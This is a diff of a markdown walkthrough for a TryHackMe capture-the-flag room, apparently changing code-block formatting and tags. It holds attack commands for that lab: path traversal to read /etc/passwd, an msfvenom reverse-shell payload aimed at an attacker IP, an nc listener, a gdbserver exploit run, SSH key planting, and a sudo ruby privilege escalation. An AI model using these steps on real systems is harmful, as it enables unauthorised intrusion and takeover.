@@ -1,12 +1,12 @@
 ---
 tags:
   - THM
-  - Linux
   - Medium
+  - Linux
   - LFI
-  - Brute-Force
   - Scripting
-  - RCE
+  - Brute-Force
+  - Metasploit
   - SUID
   - Sudo
 ---
@@ -37,6 +37,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 The website at port 8000 just talks about airplanes. However, we can notice a vulnerable `page` parameter in the URL. We can **read internal files** using directory path traversal:
 ```console
 $ curl -s 'http://airplane.thm:8000/?page=../../../../etc/passwd' | grep 'sh$'
+
 root:x:0:0:root:/root:/bin/bash
 carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
 hudson:x:1001:1001::/home/hudson:/bin/bash
@@ -69,8 +70,8 @@ $ python3 discovery.py
 ```
 ## RCE
 Found an [exploit](https://www.exploit-db.com/exploits/50539) for `gdbserver`, so first we listen for connections:
-```console
-$ nc -lvnp 4444
+```bash
+nc -lvnp 4444
 ```
 
 Then, we prepare the exploit and execute it:
@@ -81,6 +82,7 @@ $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.150.216 LPORT=4444 Prepe
 
 $ python3 50539.py airplane.thm:6048 rev.bin
 ```
+
 # Post-Exploitation
 ## User Migration
 We are currently user **hudson**:
@@ -118,8 +120,8 @@ ssh-rsa AAAAB3NzaC1...
 ```
 
 Now, we store the keys in **carlos'** SSH folder:
-```console
-$ echo 'ssh-rsa AAAAB3NzaC1...' > /home/carlos/.ssh/authorized_keys
+```bash
+echo 'ssh-rsa AAAAB3NzaC1...' > /home/carlos/.ssh/authorized_keys
 ```
 
 Finally, we re-connect via SSH and get the **user flag**:
@@ -153,8 +155,8 @@ $ python3 -m http.server
 ```
 
 We listen for connections:
-```console
-$ nc -lvnp 4444
+```bash
+nc -lvnp 4444
 ```
 
 Now, we transfer the ruby file and execute it as root:
@@ -168,6 +170,6 @@ $ sudo /usr/bin/ruby /root/../tmp/rev.rb
 ```
 
 Finally, we get the **root flag**:
-```console
-# cat /root/root.txt
+```bash
+cat /root/root.txt
 ```
